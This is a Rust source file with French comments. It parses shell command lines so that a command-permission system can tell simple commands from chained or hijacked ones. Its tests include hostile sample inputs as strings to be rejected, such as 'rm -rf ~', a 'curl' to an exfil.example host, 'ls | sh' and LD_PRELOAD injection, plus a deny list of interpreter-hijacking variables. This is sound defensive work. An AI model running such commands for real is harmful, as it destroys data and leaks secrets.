//! Découpage d'une ligne de commande (issue #141).
//!
//! Quatre questions sont posées à une ligne de `shell_exec` : sa famille (ce que borne un
//! « Toujours »), la règle qui la couvre, l'autorisation déclarée d'avance, et si elle ne
//! fait que lire. Elles étaient tranchées par trois découpages différents, tous en
//! cherchant `; & | ( ) $ …` **dans le texte brut**, guillemets compris : une URL de
//! requête (`glab api "projects?membership=true&per_page=100"`) passait pour un
//! enchaînement, donc aucune règle n'était créée et aucune ne s'appliquait.
//!
//! Ce module est le seul découpage. Il rend des **tokens, jamais des offsets** : un indice
//! calculé sur une chaîne puis appliqué à une autre est la cause de #130.
//!
//! Ce qui reste **composé**, et ne peut donc ni avoir de famille ni être une lecture :
//! un opérateur hors guillemets (`;`, `&`, `|`, `<`, `>`, `(`, `)`), une substitution
//! (`$`, `` ` ``) ou un échappement (`\`) hors apostrophes — donc même entre guillemets
//! doubles, où ils gardent leur pouvoir —, un saut de ligne, une négation (`!` en tête),
//! des guillemets non fermés, ou une affectation d'environnement qui détourne
//! l'interpréteur (`PATH=`, `LD_PRELOAD=`, `NODE_OPTIONS=`…).

/// Une ligne de commande simple : les affectations d'environnement qui la précèdent, puis
/// le programme et ses arguments, guillemets retirés.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SimpleCommand {
    /// `VAR=valeur` en tête de ligne, dans l'ordre.
    pub assignments: Vec<(String, String)>,
    /// Programme puis arguments.
    pub words: Vec<String>,
}

impl SimpleCommand {
    /// Programme appelé, sans les affectations qui le précèdent.
    pub fn program(&self) -> Option<&str> {
        self.words.first().map(String::as_str)
    }
}

/// Opérateurs qui enchaînent, redirigent ou groupent, hors guillemets.
const OPERATORS: &[char] = &[';', '&', '|', '<', '>', '(', ')', '\n', '\r'];
/// Substitution et échappement : ils gardent leur pouvoir entre guillemets doubles, donc
/// une ligne qui en porte reste composée où qu'ils soient, sauf entre apostrophes.
const EXPANSION: &[char] = &['$', '`', '\\'];

/// Découpe une ligne simple. `None` si elle est composée (voir l'en-tête du module).
pub fn simple(line: &str) -> Option<SimpleCommand> {
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    // Un mot peut être vide (`""`) : il faut le distinguer de « pas de mot en cours ».
    let mut started = false;
    let mut chars = line.chars();
    while let Some(c) = chars.next() {
        match c {
            // Entre apostrophes, tout est littéral jusqu'à l'apostrophe suivante.
            '\'' => {
                started = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(ch) => word.push(ch),
                        None => return None,
                    }
                }
            }
            // Entre guillemets doubles, tout est littéral sauf `$`, `` ` `` et `\`.
            '"' => {
                started = true;
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some(ch) if EXPANSION.contains(&ch) => return None,
                        Some(ch) => word.push(ch),
                        None => return None,
                    }
                }
            }
            c if OPERATORS.contains(&c) || EXPANSION.contains(&c) => return None,
            c if c.is_whitespace() => {
                if started {
                    words.push(std::mem::take(&mut word));
                    started = false;
                }
            }
            c => {
                started = true;
                word.push(c);
            }
        }
    }
    if started {
        words.push(word);
    }
    // `! cmd` nie le code de retour d'un pipeline : la ligne n'est pas celle qu'on lit.
    if words.first().is_some_and(|w| w == "!") {
        return None;
    }
    let mut assignments = Vec::new();
    let mut i = 0;
    while let Some((name, value)) = words.get(i).and_then(|w| split_assignment(w)) {
        // `PATH=/tmp ls` n'est pas `ls` : la ligne reste composée, aucune règle `ls` ne la
        // couvre et ce n'est pas une lecture.
        if hijacks_interpreter(&name) {
            return None;
        }
        assignments.push((name, value));
        i += 1;
    }
    let words = words.split_off(i);
    Some(SimpleCommand { assignments, words })
}

/// Famille de commandes d'une règle (`cargo test`, `glab`) : ses mots, ou `None` si elle
/// ne peut couvrir aucune ligne (composée, vide, ou faite d'affectations).
pub fn family(prefix: &str) -> Option<Vec<String>> {
    let cmd = simple(prefix)?;
    (!cmd.words.is_empty() && cmd.assignments.is_empty()).then_some(cmd.words)
}

/// `VAR=valeur` en tête de ligne : un nom de variable d'environnement valide, puis sa
/// valeur. `make CC=gcc` n'en est pas une : elle suit le programme, l'appelant ne
/// regarde que les mots de tête.
fn split_assignment(word: &str) -> Option<(String, String)> {
    let (name, value) = word.split_once('=')?;
    let valid = name
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
    valid.then(|| (name.to_string(), value.to_string()))
}

/// Une variable qui change ce que la ligne exécute vraiment : chemin de recherche,
/// bibliothèque préchargée, fichier de démarrage ou options d'un interpréteur. Une ligne
/// qui en porte une reste composée, quelle que soit la commande qui suit.
fn hijacks_interpreter(name: &str) -> bool {
    const NAMES: &[&str] = &[
        "PATH",
        "HOME",
        "IFS",
        "ENV",
        "BASH_ENV",
        "SHELLOPTS",
        "BASHOPTS",
        "CDPATH",
        "PS4",
        "NODE_OPTIONS",
        "PYTHONSTARTUP",
        "PYTHONPATH",
        "PYTHONHOME",
        "PERL5OPT",
        "PERL5LIB",
        "RUBYOPT",
        "RUBYLIB",
        "GIT_SSH_COMMAND",
        "GIT_EXTERNAL_DIFF",
        "GIT_PAGER",
        "PAGER",
        "EDITOR",
        "VISUAL",
    ];
    const PREFIXES: &[&str] = &["DYLD_", "LD_", "GIT_CONFIG", "BASH_FUNC_"];
    NAMES.contains(&name) || PREFIXES.iter().any(|p| name.starts_with(p))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn words(line: &str) -> Vec<String> {
        simple(line).expect("ligne simple").words
    }

    /// #141 : un `&`, un `|` ou une parenthèse entre guillemets est un caractère, pas un
    /// enchaînement.
    #[test]
    fn quoted_operators_are_characters_not_chaining() {
        assert_eq!(
            words("glab api --hostname h \"projects?a=1&b=2\""),
            ["glab", "api", "--hostname", "h", "projects?a=1&b=2"]
        );
        assert_eq!(words("echo \"a & b\""), ["echo", "a & b"]);
        assert_eq!(words("grep -n 'x | y' f"), ["grep", "-n", "x | y", "f"]);
        assert_eq!(words("printf \"(%s)\" x"), ["printf", "(%s)", "x"]);
        assert_eq!(words("jq '.[] | .path'"), ["jq", ".[] | .path"]);
        // Guillemets collés au mot : un seul mot ; un mot vraiment vide reste un mot.
        assert_eq!(words("git commit -m'wip'"), ["git", "commit", "-mwip"]);
        assert_eq!(words("git commit -m \"\""), ["git", "commit", "-m", ""]);
    }

    /// Ce que #67 a fermé reste fermé : tout ce qui enchaîne, substitue ou redirige hors
    /// apostrophes compose la ligne.
    #[test]
    fn chaining_outside_quotes_still_composes() {
        for composed in [
            "cargo test; rm -rf ~",
            "cargo test && curl https://exfil.example",
            "ls | sh",
            "glab api h \"p\" | jq -r '.[].path'",
            "cat x > y",
            "cat < x",
            "echo $(rm -rf ~)",
            "echo \"$(rm -rf ~)\"",
            "echo \"$HOME\"",
            "echo \"`id`\"",
            "echo `id`",
            "(ls)",
            "ls\nrm -rf /",
            "echo \"non fermé",
            "grep 'x",
            "l\\s",
            "echo \"a\\$b\"",
            "! ls",
            "cat <<EOF\ndata\nEOF",
        ] {
            assert!(simple(composed).is_none(), "{composed}");
        }
    }

    /// Les affectations de tête : la famille est celle du programme, sauf quand la
    /// variable détourne ce qui sera exécuté.
    #[test]
    fn leading_assignments_keep_the_program_unless_they_hijack_it() {
        let c = simple("GITLAB_HOST=h glab api \"p?x=1\"").expect("ligne simple");
        assert_eq!(c.assignments, [("GITLAB_HOST".into(), "h".into())]);
        assert_eq!(c.words, ["glab", "api", "p?x=1"]);
        assert_eq!(c.program(), Some("glab"));
        // Une valeur entre guillemets, et deux affectations.
        let c = simple("A=1 B=\"deux mots\" ls -la").expect("ligne simple");
        assert_eq!(c.words, ["ls", "-la"]);
        assert_eq!(c.assignments.len(), 2);
        for hijack in [
            "PATH=/tmp ls",
            "DYLD_INSERT_LIBRARIES=x.dylib glab api \"p\"",
            "LD_PRELOAD=/tmp/x.so ls",
            "IFS=, ls",
            "GIT_SSH_COMMAND=x git fetch",
            "GIT_CONFIG_COUNT=1 git log",
            "NODE_OPTIONS=--require=/tmp/x node -v",
            "PA\"TH\"=/tmp ls",
        ] {
            assert!(simple(hijack).is_none(), "{hijack}");
        }
        // Après le programme, `k=v` est un argument comme un autre.
        assert_eq!(words("make CC=gcc all"), ["make", "CC=gcc", "all"]);
    }

    /// Une famille couvre une ligne ; une famille impossible n'en couvre aucune.
    #[test]
    fn a_family_is_a_simple_line_without_assignment() {
        assert_eq!(
            family("cargo test"),
            Some(vec!["cargo".into(), "test".into()])
        );
        assert_eq!(family("glab"), Some(vec!["glab".into()]));
        for useless in ["GITLAB_HOST=h", "cd /x && ls", "", "   ", "PATH=/tmp ls"] {
            assert!(family(useless).is_none(), "{useless:?}");
        }
    }

    /// #130 : les formes inhabituelles ne paniquent pas et ne rendent jamais une ligne
    /// simple là où il y a un enchaînement.
    #[test]
    fn unusual_shapes_never_panic() {
        for shape in [
            "",
            " ",
            "ls",
            "cd",
            "cd /x &&",
            "python3 - <<'PYEOF'\nprint(\"a\")\nPYEOF",
            "cat <<EOF\n{{.Name}}\nEOF",
            "\n\n",
            "é",
            "\"\"",
            "''",
            "=x ls",
        ] {
            let _ = simple(shape);
        }
        assert!(simple("").expect("vide").words.is_empty());
        assert_eq!(words("ls"), ["ls"]);
        // Un premier mot qui n'est pas une affectation valide reste le programme.
        assert_eq!(words("=x ls"), ["=x", "ls"]);
    }
}
